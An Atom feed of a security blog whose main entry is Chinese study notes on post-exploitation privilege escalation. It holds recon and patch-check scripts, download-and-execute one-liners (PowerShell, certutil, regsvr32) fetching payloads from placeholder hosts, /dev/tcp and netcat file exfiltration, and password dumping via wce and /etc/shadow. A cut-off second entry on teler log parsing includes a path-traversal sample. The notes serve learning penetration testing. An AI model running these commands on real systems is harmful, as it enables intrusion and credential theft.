<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dr34d&#39;s blog</title>
  
  <subtitle>Dr34d</subtitle>
  <link href="https://greydr34d.github.io/atom.xml" rel="self"/>
  
  <link href="https://greydr34d.github.io/"/>
  <updated>2021-03-15T15:48:38.000Z</updated>
  <id>https://greydr34d.github.io/</id>
  
  <author>
    <name>Dr34d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《网络攻防实战研究：漏洞利用与提权》笔记——提权准备工作</title>
    <link href="https://greydr34d.github.io/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/"/>
    <id>https://greydr34d.github.io/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/</id>
    <published>2021-03-15T15:40:43.000Z</published>
    <updated>2021-03-15T15:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本菜鸡准备研读《网络攻防实战研究：漏洞利用与提权》这本宝典，太感动了，前辈们写的通俗易懂、由浅入深。书中的理论知识很大程度上扩展了我的渗透思路，使我受益颇丰，笔者在此记录书中内容的同时，也记录研读时的不懂之处，查阅多方资料，对要点进行补充。人菜就要多读书~~。</p><blockquote><p>提权是整个黑客攻防过程中  难的一个环节。对渗透来说，获取的权限越高，控制的服务器权限越多，也就越有成就感。在整个渗透流程中，提权过程汇聚了思路、技巧、工具和技术。高楼大厦总是需要坚实的地基，在渗透过程中，基础越扎实，就越容易取得   终的胜利。</p><p>——《网络攻防实战研究：漏洞利用与提权》</p></blockquote><h1 id="0x02-提权准备工作"><a href="#0x02-提权准备工作" class="headerlink" title="0x02 提权准备工作"></a>0x02 提权准备工作</h1><h2 id="1-对目标服务器进行信息收集"><a href="#1-对目标服务器进行信息收集" class="headerlink" title="1. 对目标服务器进行信息收集"></a>1. 对目标服务器进行信息收集</h2><blockquote><p>（1）目标服务器信息的收集利用已有权限或者条件，对需要提权的目标服务器进行信息收集，例如在有 WebShell 等的情况</p></blockquote><p>下执行命令获取 Windows 操作系统的信息。 </p><ul><li><p>systeminfo：获取操作系统类型、版本、位数等信息。</p></li><li><p>ipconfig /all：获取是否为独立 IP 地址、DNS、计算机名称等信息。</p></li><li><p>net user：当前用户信息。</p></li><li><p>whoami：当前用户权限。</p></li><li><p>netstat-an：当前端口开放情况。收集系统信息的一个脚本程序如下。</p></li></ul><p>收集系统信息的一个脚本程序如下</p><div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off <span class="hljs-built_in">echo</span> #########system info collection systeminfo <span class="hljs-built_in">ver</span> hostname <span class="hljs-built_in">net</span> user <span class="hljs-built_in">net</span> localgroup <span class="hljs-built_in">net</span> localgroup administrators <span class="hljs-built_in">net</span> user guest <span class="hljs-built_in">net</span> user administrator <span class="hljs-built_in">echo</span> #######<span class="hljs-built_in">at</span>- with atq##### <span class="hljs-built_in">echo</span> schtask /query <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> ####task-list############# tasklist /svc <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> ####<span class="hljs-built_in">net</span>-work infomation <span class="hljs-built_in">ipconfig</span>/all route <span class="hljs-built_in">print</span> arp -a netstat -anipconfig /displaydns <span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> #######service############ sc query <span class="hljs-built_in">type</span>= service state= all <span class="hljs-built_in">echo</span> #######file-############## <span class="hljs-built_in">cd</span> \ <span class="hljs-built_in">tree</span> –F</code></pre></div><h2 id="2-收集目标服务器漏洞补丁情况"><a href="#2-收集目标服务器漏洞补丁情况" class="headerlink" title="2. 收集目标服务器漏洞补丁情况"></a>2. 收集目标服务器漏洞补丁情况</h2><blockquote><p>（2）准备提权服务器的漏洞补丁情况收集</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs bat">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="hljs-keyword">for</span> %i <span class="hljs-keyword">in</span> (KB977165 KB970483 KB3057191 KB3079904 KB3077657 KB3045171 KB2840221 KB3000061 KB2850851 KB2707511 KB2711167 KB2124261 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440 KB3124280 KB3143141 KB3134228) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">type</span> C:\Windows\Temp\ temp.txt|@<span class="hljs-built_in">find</span> /i &quot;%i&quot;|| @<span class="hljs-built_in">echo</span> %i <span class="hljs-keyword">Not</span> Installed!)&amp;<span class="hljs-built_in">del</span> /f /q /a C:\Windows\Temp\temp.txt</code></pre></div><p>补丁号对应的可供利用的程序名称列举如下。</p><ul><li> KB2360937：MS10-084。  </li><li> KB2478960：MS11-014。</li><li> KB2507938：MS11-056。 </li><li> KB2566454：MS11-062。  </li><li> KB2646524：MS12-003。</li><li> KB2645640：MS12-009。 </li><li> KB2641653：MS12-018。 </li><li> KB944653：MS07-067。 </li><li> KB952004：MS09-012 PR。 </li><li> KB971657：MS09-041。 </li><li> KB2620712：MS11-097。  </li><li> KB2393802：MS11-011。 </li><li> KB942831：MS08-005。</li><li> KB2503665：MS11-046。 </li><li> KB2592799：MS11-080。 </li><li> KB956572：MS09-012 烤肉。 </li><li> KB2621440：MS12-020。 </li><li> KB977165：MS10-015 Ms Viru。</li><li> KB3124280：MS16-032。 </li><li> KB3143141：MS16-016。 </li><li> KB3134228：MS16-014。 </li><li> KB3079904：MS15-097。 </li><li> KB3077657：MS15-077。 </li><li> KB3045171：MS15-051。 </li><li> KB3000061：MS14-058。 </li><li> KB2829361：MS13-046。 </li><li> KB2850851：MS13-053 EPATHOBJ 0day（限 32 位）。</li><li> KB2707511：MS12-042 sysret –pid。</li><li> KB2124261 和 KB2271195：MS10-065 IIS7。</li><li> KB970483：MS09-020 IIS6。</li></ul><h2 id="3-准备提权-0day-及其他相关工具"><a href="#3-准备提权-0day-及其他相关工具" class="headerlink" title="3. 准备提权 0day 及其他相关工具"></a>3. 准备提权 0day 及其他相关工具</h2><blockquote><p>针对当前操作系统准备 32 位或 64 位提权 0day。针对当前操作系统应用程序准备提权 0day。准 备获取密码的 Hash 工具，并对 0day 及其相关工具进行免杀处理和测试。</p></blockquote><h2 id="4-寻找服务器可写目录"><a href="#4-寻找服务器可写目录" class="headerlink" title="4. 寻找服务器可写目录"></a>4. 寻找服务器可写目录</h2><p>在目标服务器中找到一个可写目录。</p><h1 id="0x03-实施提权"><a href="#0x03-实施提权" class="headerlink" title="0x03 实施提权"></a>0x03 实施提权</h1><h2 id="1-上传或者下载提权-0day-和相关工具"><a href="#1-上传或者下载提权-0day-和相关工具" class="headerlink" title="1. 上传或者下载提权 0day 和相关工具"></a>1. 上传或者下载提权 0day 和相关工具</h2><blockquote><p>将文件上传到服务器有多种方式，例如通过 WebShell、FTP、下载命令等将工具上传到系统的 可写目录下。一些可供参考的下载方法如下。</p></blockquote><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="使用-vbs-下载"><a href="#使用-vbs-下载" class="headerlink" title="使用 vbs 下载"></a>使用 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs vbscript">iLocal = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">1</span>)) iRemote = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">0</span>)) <span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,iRemote,<span class="hljs-number">0</span> xPost.Send() <span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) sGet.Mode = <span class="hljs-number">3</span> sGet.Type = <span class="hljs-number">1</span> sGet.Open() sGet.Write(xPost.responseBody) sGet.SaveToFile iLocal,<span class="hljs-number">2</span></code></pre></div><p>使用命令“cscript down.vbs <a href="http://www.antian365.com/ma.exe">http://www.antian365.com/ma.exe</a> c:/ma.exe”，将 ma.exe 保存到 C 盘 根目录下，不写路径则会显示程序执行出错。</p><p>固定下载程序位置和名称并下载，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript">url = <span class="hljs-string">&quot;http:// www.antian365.com /ma.exe&quot;</span> <span class="hljs-comment">&#x27;网络上的文件地址</span>saveas = <span class="hljs-string">&quot;c:\ma.exe&quot;</span> <span class="hljs-comment">&#x27;保存的本地文件</span><span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) <span class="hljs-comment">&#x27;创建 HTTP 请求对象</span><span class="hljs-keyword">Set</span> stream = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) <span class="hljs-comment">&#x27;创建 ADO 数据流对象</span><span class="hljs-keyword">Call</span> xmlhttp.open(<span class="hljs-string">&quot;GET&quot;</span>,url,<span class="hljs-literal">False</span>) <span class="hljs-comment">&#x27;打开连接</span><span class="hljs-keyword">Call</span> xmlhttp.send() <span class="hljs-comment">&#x27;发送请求</span>stream.mode = <span class="hljs-number">3</span> <span class="hljs-comment">&#x27;设置数据流为读写模式</span>stream.type = <span class="hljs-number">1</span> <span class="hljs-comment">&#x27;设置数据流为二进制模式</span><span class="hljs-keyword">Call</span> stream.open() <span class="hljs-comment">&#x27;打开数据流</span><span class="hljs-keyword">Call</span> stream.write(xmlhttp.responsebody) <span class="hljs-comment">&#x27;将服务器的返回报文主体内容写入数据流</span><span class="hljs-keyword">Call</span> stream.savetofile(saveas,<span class="hljs-number">2</span>) <span class="hljs-comment">&#x27;将数据流保存为文件</span><span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-literal">Nothing</span> <span class="hljs-keyword">Set</span> stream = <span class="hljs-literal">Nothing</span></code></pre></div><p>将以上代码保存为 down.vbs 文件，执行“cscript down.vbs”命令即可下载程序 ma.exe 到 C 盘中。</p><p>另外一种下载文件的方法，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot; http:// www.antian365.com /ma.exe &quot;</span>,<span class="hljs-number">0</span> <span class="hljs-comment">&#x27;下载文件的地址</span>xPost.Send() <span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) sGet.Mode = <span class="hljs-number">3</span> sGet.Type = <span class="hljs-number">1</span> sGet.Open() sGet.Write(xPost.responseBody) sGet.SaveToFile <span class="hljs-string">&quot;c:\2.exe&quot;</span>,<span class="hljs-number">2</span> <span class="hljs-comment">&#x27;保存文件的路径和文件名</span></code></pre></div><h4 id="使用-powershell-下载"><a href="#使用-powershell-下载" class="headerlink" title="使用 powershell 下载"></a>使用 powershell 下载</h4><p>下载并执行:</p><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://1.2.3.4/5.exe&#x27;</span>,<span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span>);<span class="hljs-built_in">start-process</span> <span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span></code></pre></div><h4 id="Perl文件下载"><a href="#Perl文件下载" class="headerlink" title="Perl文件下载"></a>Perl文件下载</h4><p>Perl是一种用途非常广泛的脚本语言，几乎可以用于任何东西。使用Perl可以非常轻松地将文件下载到本地主机上。</p><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl </span><span class="hljs-keyword">use</span> LWP::Simple; getstore(<span class="hljs-string">&quot;http://domain/file&quot;</span>, <span class="hljs-string">&quot;file&quot;</span>);</code></pre></div><p>perl test.pl</p><h4 id="Python文件下载"><a href="#Python文件下载" class="headerlink" title="Python文件下载"></a>Python文件下载</h4><p>Python是一种通用的脚本语言，强调代码的可读性。与大多数脚本语言一样，目标是编写的代码少于编程语言所需的代码，同时仍能完成预期的任务。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">import</span> urllib2 u = urllib2.urlopen(<span class="hljs-string">&#x27;http://domain/file&#x27;</span>) localFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;local_file&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) localFile.write(u.read()) localFile.close()</code></pre></div><h4 id="Ruby文件下载"><a href="#Ruby文件下载" class="headerlink" title="Ruby文件下载"></a>Ruby文件下载</h4><p>Ruby是一种面向对象的编程语言，可用于许多事情，从创建框架（例如Metasploit）到简单的任务（例如下载文件）。</p><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/ruby</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span> Net::HTTP.start(<span class="hljs-string">&quot;www.domain.com&quot;</span>) &#123;     <span class="hljs-params">|http|</span> r = http.get(<span class="hljs-string">&quot;/file&quot;</span>)     open(<span class="hljs-string">&quot;save_location&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) &#123;         <span class="hljs-params">|file|</span> file.write(r.body)         &#125;     &#125;</code></pre></div><p>ruby test.rb</p><h4 id="PHP文件下载"><a href="#PHP文件下载" class="headerlink" title="PHP文件下载"></a>PHP文件下载</h4><p>PHP通常是用于Web开发的服务器端脚本语言，但也可以用作通用脚本语言。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/php </span><span class="hljs-meta">&lt;?php</span>         <span class="hljs-variable">$data</span> = @file(<span class="hljs-string">&quot;http://example.com/file&quot;</span>);         <span class="hljs-variable">$lf</span> = <span class="hljs-string">&quot;local_file&quot;</span>;         <span class="hljs-variable">$fh</span> = fopen(<span class="hljs-variable">$lf</span>, <span class="hljs-string">&#x27;w&#x27;</span>);         fwrite(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>]);         fclose(<span class="hljs-variable">$fh</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>php test.php</p><h4 id="使用-bitsadmin-命令下载文件"><a href="#使用-bitsadmin-命令下载文件" class="headerlink" title="使用 bitsadmin 命令下载文件"></a>使用 bitsadmin 命令下载文件</h4><p>第一种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myjob1 /download /priority normal http://antian365.com/psexec.exe c:\psexec.exe</code></pre></div><p>第二种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getfile http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div><p>第三种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getpayload http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div><p>第四种方式，代码如下。</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://download.sysinternals.com/files/PSTools.zip&quot; &quot;c:\p.zip&quot;</code></pre></div><h4 id="在-bat-模式下执行-vbs-下载"><a href="#在-bat-模式下执行-vbs-下载" class="headerlink" title="在 bat 模式下执行 vbs 下载"></a>在 bat 模式下执行 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> xPost.Open &quot;GET&quot;,&quot;http://<span class="hljs-number">58</span>.<span class="hljs-number">54</span>.<span class="hljs-number">99</span>.<span class="hljs-number">22</span>:<span class="hljs-number">8080</span>/<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">0</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> xPost.Send() &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> sGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Mode</span> = <span class="hljs-number">3</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Type</span> = <span class="hljs-number">1</span> &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.Open() &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.Write(xPost.responseBody) &gt;&gt;<span class="hljs-number">1</span>.vbs <span class="hljs-built_in">echo</span> sGet.SaveToFile &quot;<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">2</span> &gt;&gt;<span class="hljs-number">1</span>.vbs</code></pre></div><h4 id="在-FTP-命令模式下下载。"><a href="#在-FTP-命令模式下下载。" class="headerlink" title="在 FTP 命令模式下下载。"></a>在 FTP 命令模式下下载。</h4><p>down.bat 内容如下。</p><div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off @<span class="hljs-built_in">set</span> temp=C:\script.txt <span class="hljs-built_in">echo</span> open <span class="hljs-number">10</span>.<span class="hljs-number">229</span>.<span class="hljs-number">23</span>.<span class="hljs-number">77</span>&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">cd</span> General&gt;&gt;<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">echo</span> lcd <span class="hljs-variable">%2&gt;&gt;%</span>temp% <span class="hljs-built_in">echo</span> get <span class="hljs-variable">%1&gt;&gt;%</span>temp% <span class="hljs-built_in">echo</span> quit&gt;&gt;<span class="hljs-variable">%temp%</span> @ftp -s:<span class="hljs-variable">%temp%</span> <span class="hljs-built_in">del</span> <span class="hljs-variable">%temp%</span></code></pre></div><p>执行命令“down.bat filename C:\”，参数 1 是要下载的文件名，参数 2 是下载的目标路径。使用 同样的方法也可以实现文件上传。</p><h4 id="TFTP文件下载"><a href="#TFTP文件下载" class="headerlink" title="TFTP文件下载"></a>TFTP文件下载</h4><p>Windows Vista和更低版本中默认情况下带有琐碎的FTP。请注意，您将必须设置要连接的相应服务器。可以使用以下命令运行它：</p><h4 id="使用-certutil"><a href="#使用-certutil" class="headerlink" title="使用 certutil"></a>使用 certutil</h4><p>下载并执行:</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">certutil -urlcache -split -f http://<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span>/<span class="hljs-number">5</span>.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</code></pre></div><h4 id="使用-regsvr32"><a href="#使用-regsvr32" class="headerlink" title="使用 regsvr32"></a>使用 regsvr32</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">regsvr32 <span class="hljs-regexp">/u /</span>s <span class="hljs-regexp">/i:http:/</span><span class="hljs-regexp">/1.2.3.4/</span><span class="hljs-number">5</span>.exe scrobj.dll</code></pre></div><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="使用-wget（linux）"><a href="#使用-wget（linux）" class="headerlink" title="使用 wget（linux）"></a>使用 wget（linux）</h4><p>在 Linux 下，通过“wget <a href="http://www.antian365.com/shell.txt%E2%80%9D%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD">http://www.antian365.com/shell.txt”命令下载</a> shell.txt 文件到本地服务器。 </p><h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>/backdoor</code></pre></div><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><div class="hljs code-wrapper"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;</span><span class="hljs-string">  RS = ORS = &quot;\r\n&quot;</span><span class="hljs-string">  HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot;</span><span class="hljs-string">  print &quot;GET /secret.txt HTTP/1.1\r\nConnection: close\r\n&quot;    |&amp; HTTPCon</span><span class="hljs-string">  while (HTTPCon |&amp; getline &gt; 0)</span><span class="hljs-string">      print $0</span><span class="hljs-string">  close(HTTPCon)</span><span class="hljs-string">&#125;&#x27;</span></code></pre></div><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h4><p>文件接收端:</p><div class="hljs code-wrapper"><pre><code class="hljs sh">nc -lvnp 1337 &gt; secret.txt</code></pre></div><p>文件发送端:</p><div class="hljs code-wrapper"><pre><code class="hljs sh">cat secret.txt &gt; /dev/tcp/ip/port</code></pre></div><h4 id="使用-NetCat-进行文件传输"><a href="#使用-NetCat-进行文件传输" class="headerlink" title="使用 NetCat 进行文件传输"></a>使用 NetCat 进行文件传输</h4><p>接受端:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div><p>发送端：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.txt | nc -l -p <span class="hljs-number">1337</span></code></pre></div><p>或者</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.10.200</span> <span class="hljs-number">1337</span> &lt; <span class="hljs-number">1</span>.txt</code></pre></div><p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">cat &lt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.10.200/</span><span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div><h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><h4 id="使用-ping-命令进行文件传输"><a href="#使用-ping-命令进行文件传输" class="headerlink" title="使用 ping 命令进行文件传输"></a>使用 ping 命令进行文件传输</h4><h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><h4 id="利用HTTP-Server-进行文件传输"><a href="#利用HTTP-Server-进行文件传输" class="headerlink" title="利用HTTP Server 进行文件传输"></a>利用HTTP Server 进行文件传输</h4><p>具体参考：<a href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a>.</p><p>还有很多关于上传下载文件的好文章我放在参考链接处了。</p><h2 id="2-执行-0day-进行提权尝试"><a href="#2-执行-0day-进行提权尝试" class="headerlink" title="2. 执行 0day 进行提权尝试"></a>2. 执行 0day 进行提权尝试</h2><p>在 WebShell 状态下执行提权 0day。通常通过 0day 添加普通用户为管理员，或者通过 0day 执行 其他可执行程序（例如木马、系统密码获取工具等）。</p><h2 id="3-获取系统权限及操作系统的密码"><a href="#3-获取系统权限及操作系统的密码" class="headerlink" title="3. 获取系统权限及操作系统的密码"></a>3. 获取系统权限及操作系统的密码</h2><p>使用密码获取软件获取操作系统的密码。例如，“使用 wce –w”命令获取 Windows 系统当前登 录的明文密码，使用“cat /etc/shadow”命令获取 Linux 操作系统 Shadow 文件的内容。</p><h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><ul><li>《网络攻防实战研究：漏洞利用与提权》</li><li><a href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a></li><li><a href="https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html">渗透技巧——通过cmd上传文件的N种方法</a></li><li><a href="https://blog.netspi.com/15-ways-to-download-a-file/">15 Ways to Download a File</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;本菜鸡准备研读《网络攻防实战研究：漏洞利用与提权》这本宝典，太感动了，前辈们写的通俗易懂、由浅入深。</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://greydr34d.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="提权" scheme="https://greydr34d.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="渗透测试" scheme="https://greydr34d.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="提权" scheme="https://greydr34d.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="上传" scheme="https://greydr34d.github.io/tags/%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="下载" scheme="https://greydr34d.github.io/tags/%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>teler 坑一：日志格式解析坑</title>
    <link href="https://greydr34d.github.io/2021/03/13/teler-%E5%9D%91%E4%B8%80%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%E5%9D%91/"/>
    <id>https://greydr34d.github.io/2021/03/13/teler-%E5%9D%91%E4%B8%80%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%E5%9D%91/</id>
    <published>2021-03-13T08:40:10.000Z</published>
    <updated>2021-03-13T14:42:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="teler-坑一：日志格式解析坑"><a href="#teler-坑一：日志格式解析坑" class="headerlink" title="teler 坑一：日志格式解析坑"></a>teler 坑一：日志格式解析坑</h1><p>我尝试使用如下的日志格式，加入$request_body</p><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span>  main  <span class="hljs-string">&#x27;$remote_addr $remote_user - [$time_iso8601] &quot;$request&quot; &#x27;</span>                  <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span>                  <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$request_body&quot; &#x27;</span>;</code></pre></div><p>我使用如下格式的若干数据进行测试</p><div class="hljs code-wrapper"><pre><code class="hljs nginx">192.168.68.129 - - [2021-03-11T01:31:26+00:00] &quot;POST /index.php HTTP/1.1&quot; 404 287 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; &quot;id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%7bFILE%7d&amp;name=111asdasdaasd&quot;</code></pre></div><p>teler.yaml</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">log_format:</span> <span class="hljs-string">|</span>  <span class="hljs-string">$remote_addr</span> <span class="hljs-string">$remote_user</span> <span class="hljs-bullet">-</span> [<span class="hljs-string">$time_local</span>] <span class="hljs-string">&quot;$request_method $request_uri $request_protocol&quot;</span>   <span class="hljs-string">$status</span> <span class="hljs-string">$body_bytes_sent</span> <span class="hljs-string">&quot;$http_referer&quot;</span> <span class="hljs-string">&quot;$http_user_agent&quot;</span> <span class="hljs-string">&quot;$request_body&quot;</span></code></pre></div><p>直接解析不到</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210311093400339.png" 